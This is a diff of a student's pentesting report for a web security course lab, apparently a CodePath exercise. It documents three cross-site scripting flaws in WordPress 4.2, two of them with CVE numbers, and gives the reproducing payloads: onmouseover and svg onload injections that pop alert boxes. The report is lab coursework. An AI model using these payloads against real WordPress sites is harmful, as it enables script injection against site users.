@@ -7,47 +7,47 @@ Time spent: **2.5** hours spent in total
 ## Pentesting Report
 
 1. (Required) CVE-2015-3440
-  - [ ] Summary: 
+  - [X] Summary: 
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
-  - [ ] GIF Walkthrough: https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_1.gif
-  - [ ] Steps to recreate: Enter the following in the Reply:
+  - [X] GIF Walkthrough: https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_1.gif
+  - [X] Steps to recreate: Enter the following in the Reply:
   
-<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+`<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
        
-  - [ ] Affected source code:
+  - [X] Affected source code:
     - [Link 1](https://www.exploit-db.com/exploits/36844/)
     
     
     
 2. (Required) Vulnerability Name or ID
-  - [ ] Summary: XSS (Authenticated Cross-Site Scripting)
+  - [X] Summary: XSS (Authenticated Cross-Site Scripting)
     - Vulnerability types:XSS
     - Tested in version:4.2
     - Fixed in version: 4.2.6
-  - [ ] GIF Walkthrough: https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_2.gif
-  - [ ] Steps to recreate: Enter the following in the Reply:
+  - [X] GIF Walkthrough: https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_2.gif
+  - [X] Steps to recreate: Enter the following in the Reply:
   
-  http://www.test.com/wp-admin/customize.php?theme=<svg onload=alert(2)>
+  `http://www.test.com/wp-admin/customize.php?theme=<svg onload=alert(2)>`
   
-  - [ ] Affected source code:
+  - [X] Affected source code:
     - [Link 2](https://github.com/WordPress/WordPress/blob/master/wp-admin/customize.php)
     
     
     
    
 3. (Required) Vulnerability Name or ID
-  - [ ] Summary: CVE-2015-5734
+  - [X] Summary: CVE-2015-5734
     - Vulnerability types: XSS
     - Tested in version:4.2
     - Fixed in version: 4.2.4
-  - [ ] GIF Walkthrough: https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_3.gif
-  - [ ] Steps to recreate: Enter and submit the following in the Reply:
+  - [X] GIF Walkthrough: https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_3.gif
+  - [X] Steps to recreate: Enter and submit the following in the Reply:
   
-  <a href='/wp-admin/' title="" style="position:absolute;top:0;width:10%;height:100%;display:block;" onmouseover=alert(1)//'>TEST</a>
+  `<a href='/wp-admin/' title="" style="position:absolute;top:0;width:10%;height:100%;display:block;" onmouseover=alert(1)//'>TEST</a>`
   
-  - [ ] Affected source code:
+  - [X] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 
 
